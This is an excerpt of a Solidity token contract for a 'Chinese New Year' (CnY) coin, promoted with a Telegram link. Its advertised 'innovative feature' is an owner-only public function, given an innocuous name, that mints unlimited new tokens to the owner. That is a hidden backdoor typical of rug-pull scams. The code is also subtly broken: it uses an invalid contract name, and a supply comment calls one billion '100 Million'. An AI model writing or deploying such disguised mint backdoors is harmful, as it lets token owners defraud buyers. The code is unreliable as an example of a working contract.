...
//
// $ChineseNewYear proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ChineseNewYearCN
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ChineseNewYear(uint256 amount) public onlyOwner {
 _ChineseNewYear(msg.sender, amount);
    }
    ...
    function _ChineseNewYear(address account, uint256 amount) internal virtual {
...
contract $ChineseNewYear is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Chinese New Year", "CnY") {
     _ChineseNewYear(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}